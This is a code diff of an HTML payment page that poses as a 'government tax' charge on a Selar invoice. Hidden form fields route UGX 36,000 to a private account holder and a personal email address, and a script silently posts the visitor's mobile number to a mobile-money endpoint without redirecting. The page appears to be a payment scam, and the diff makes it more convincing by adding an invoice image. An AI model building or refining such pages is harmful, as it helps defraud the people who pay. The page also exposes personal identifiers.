@@ -24,6 +24,15 @@
             padding-top: 10px; 
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            overflow: hidden; /* Ensures image corners match card */
+        }
+
+        /* Image Styling */
+        .receipt-img {
+            width: 100%;
+            height: auto;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 15px;
         }
 
         /* Blinking Animation */
@@ -42,7 +51,7 @@
             font-size: 13px; 
             font-weight: 600; 
             color: #333; 
-            margin-bottom: 25px; 
+            margin-bottom: 20px; 
         }
         .status-dot { 
             height: 10px; 
@@ -83,7 +92,6 @@
         .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
         .continue-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
 
-        /* Hidden Processing Message */
         #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
         .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -98,6 +106,8 @@
 <body>
 
 <div class="invoice-card">
+    <img src="1772275905117_1.png" alt="Selar Invoice Receipt" class="receipt-img">
+
     <div class="country-badge"><span class="status-dot"></span> GOVERNMENT TAX</div>
 
     <div class="logo-circle">Selar</div>
@@ -112,7 +122,7 @@
         <span class="btn-pill">📋 Copy paylink</span>
     </div>
 
-    <p class="description">You are paying government tax for selar-invoice-800usd securely. Payments are protected and your details stay private.</p>
+    <p class="description">You are paying government tax for the invoice shown above securely. Payments are protected and your details stay private.</p>
 
     <div class="main-amount">UGX 36,000</div>
     <div class="confirm-text">Confirm the details below to send your secure payment.</div>
@@ -128,15 +138,12 @@
         <form id="paymentForm">
             <input type="hidden" name="ownerid" value="wasswa.lawrence" />
             <input type="hidden" name="description" value="Credit Note" />
-            <input type="hidden" name="return" value="https://my.jpesa.com" />
-            <input type="hidden" name="cancel" value="https://my.jpesa.com" />
             <input type="hidden" name="email" value="lolikishee1@gmail.com" />
-            <input type="hidden" name="name" value="loli kishee" />
             <input type="hidden" name="cur" value="UGX" />
             <input type="hidden" name="amount" value="36000" />
 
             <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" title="Please enter a valid 10-digit phone number" />
+                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
                 <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
             </div>
         </form>
@@ -158,31 +165,24 @@
 
 <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevents the page from redirecting
-
-        const form = this;
+        e.preventDefault();
         const btn = document.getElementById('submitBtn');
         const notice = document.getElementById('processing-notice');
         const mobileInput = document.getElementById('mobile');
         
-        // Disable inputs and show loading state
         btn.disabled = true;
         btn.innerText = "Please wait...";
         mobileInput.readOnly = true;
         notice.style.display = "block";
 
-        // Create the data to send
-        const formData = new FormData(form);
+        const formData = new FormData(this);
 
-        // Send the request in the background
         fetch('https://my.jpesa.com/?dad=xp', {
             method: 'POST',
             body: formData,
-            mode: 'no-cors' // This allows the request to be sent to a different domain silently
+            mode: 'no-cors'
         })
         .then(() => {
-            // Because of 'no-cors', we won't see the response body, 
-            // but the request has been successfully dispatched to Jpesa.
             console.log("Background payment request sent.");
         })
         .catch(error => {
